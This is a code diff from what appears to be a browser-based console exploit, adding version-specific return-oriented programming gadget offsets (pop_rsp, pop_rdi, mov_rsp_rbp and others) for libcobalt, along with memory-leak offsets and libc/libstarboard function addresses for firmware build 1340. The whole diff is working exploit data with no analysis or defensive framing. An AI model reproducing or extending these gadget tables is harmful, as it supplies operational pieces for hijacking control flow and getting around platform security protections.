@@ -146,6 +146,23 @@ let ROP_1320 = {
     get ret()                 { return libcobalt_base + 0x31n;     },
 };
 
+let ROP_1340 = {
+    get pop_rsp()             { return libcobalt_base + 0x6f7c7n;  },
+    get pop_rax()             { return libcobalt_base + 0x35942n;  },
+    get pop_rdi()             { return libcobalt_base + 0x54bn;    },
+    get pop_rsi()             { return libcobalt_base + 0x26a5n;   },
+    get pop_rdx()             { return libcobalt_base + 0x182b43n; },
+    get pop_rcx()             { return libcobalt_base + 0x25e9n;   },
+    get pop_r8()              { return libcobalt_base + 0x35941n;  },
+    get pop_r9()              { return libcobalt_base + 0x3d9132n; },
+    get pop_rbp()             { return libcobalt_base + 0xc6n;     },
+    get mov_qword_rdi_rax()   { return libcobalt_base + 0x6fcecn;  },
+    get mov_qword_rdi_rdx()   { return libcobalt_base + 0x510fddn; },
+    get mov_rax_0x200000000() { return libcobalt_base + 0x2de890n; },
+    get mov_rsp_rbp()         { return libcobalt_base + 0x7c79acn; },
+    get ret()                 { return libcobalt_base + 0x31n;     },
+};
+
 
 let Y2_OFFSET;
 
@@ -199,6 +216,27 @@ let Y2_OFFSET_1320 = {
     
     get sceMsgDialogTerminate()          { return libstarboard_base + 0x52E4D8n; },
     get sceErrorDialogTerminate()        { return libstarboard_base + 0x52E4E8n; },
+    get sceKernelGetModuleInfoFromAddr() { return libc_base         + 0x19E488n; },
+    get gettimeofday()                   { return libc_base         + 0x19E348n; },
+    
+    get libc_strerror()                  { return libc_base         + 0x6EAC0n;  },
+    get libc_error()                     { return libc_base         + 0x11D1B0n;  },
+    
+    get Thrd_create()                    { return libc_base         + 0x50A0n;   },
+    get Thrd_join()                      { return libc_base         + 0x4EA0n;   },
+    
+}
+
+let Y2_OFFSET_1340 = {
+    LIBCOBALT_LEAK : 0x7FA73Fn,
+    LIBSTARBOARD_LEAK1 : 0x2483B20n,
+    LIBSTARBOARD_LEAK2 : 0x3DC10n,
+    LIBC_LEAK1 : 0x545DD0n,
+    LIBC_LEAK2 : 0x3AD00n,
+    RSP_OFFSET : 0x10n,
+    
+    get sceMsgDialogTerminate()          { return libstarboard_base + 0x546708n; },
+    get sceErrorDialogTerminate()        { return libstarboard_base + 0x546718n; },
     get sceKernelGetModuleInfoFromAddr() { return libc_base         + 0x19E488n; },
     get gettimeofday()                   { return libc_base         + 0x19E348n; },
     
